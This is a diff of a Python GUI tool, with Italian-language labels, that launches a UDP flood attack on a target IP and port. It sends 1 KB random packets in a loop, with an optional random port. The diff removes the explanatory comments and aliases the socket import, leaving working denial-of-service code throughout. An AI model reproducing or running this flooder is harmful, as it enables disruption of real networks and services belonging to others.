@@ -1,31 +1,24 @@
-import socket
+import socket as so
 import random
 import time
 import customtkinter as ctk
 
-# Variabile per fermare l'attacco
 attack_running = False
 
-# Funzione per generare pacchetti di 1 KB
 def generate_packet():
-    return random._urandom(1024)  # 1024 byte (1 KB)
+    return random._urandom(1024)  
 
-# Funzione per lanciare l'attacco UDP Flood
 def udp_flood(target_ip, target_port, num_packets):
-    global attack_running  # Usa la variabile globale per il controllo
+    global attack_running  
     try:
-        # Creazione del socket UDP
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock = so.socket(so.AF_INET, so.SOCK_DGRAM)
         
-        # Contatore pacchetti inviati
         sent_packets = 0
         
-        # Aggiornamento dello stato
         status_label.configure(text=f"Inizio attacco UDP flood su {target_ip}:{target_port}", text_color="green")
         
-        # Ciclo per inviare i pacchetti
         for _ in range(num_packets):
-            if not attack_running:  # Verifica se l'attacco deve essere fermato
+            if not attack_running: 
                 status_label.configure(text="Attacco interrotto.", text_color="red")
                 return
             
@@ -38,7 +31,7 @@ def udp_flood(target_ip, target_port, num_packets):
             
             time.sleep(0.01)
         
-        # Stato finale
+  
         status_label.configure(text=f"\nAttacco completato. {sent_packets} pacchetti inviati al target.", text_color="blue")
     
     except Exception as e:
@@ -46,29 +39,24 @@ def udp_flood(target_ip, target_port, num_packets):
     finally:
         sock.close()
 
-# Funzione per generare una porta casuale
 def generate_random_port():
     return random.randint(1024, 49151)
 
-# Funzione chiamata al click del pulsante "Start"
 def start_attack():
     global attack_running
-    attack_running = True  # Avvia l'attacco
+    attack_running = True  
     target_ip = ip_entry.get()
     
-    # Gestisci la porta (casuale o inserita)
     target_port = int(port_entry.get()) if not random_port_checkbox.get() else generate_random_port()
-
-    # Numero di pacchetti
+   
     num_packets = int(packets_entry.get())
     
-    # Avvia l'attacco
     udp_flood(target_ip, target_port, num_packets)
 
-# Funzione per fermare l'attacco
+
 def stop_attack():
     global attack_running
-    attack_running = False  # Ferma l'attacco
+    attack_running = False  
 
 # Creazione della finestra principale
 window = ctk.CTk()
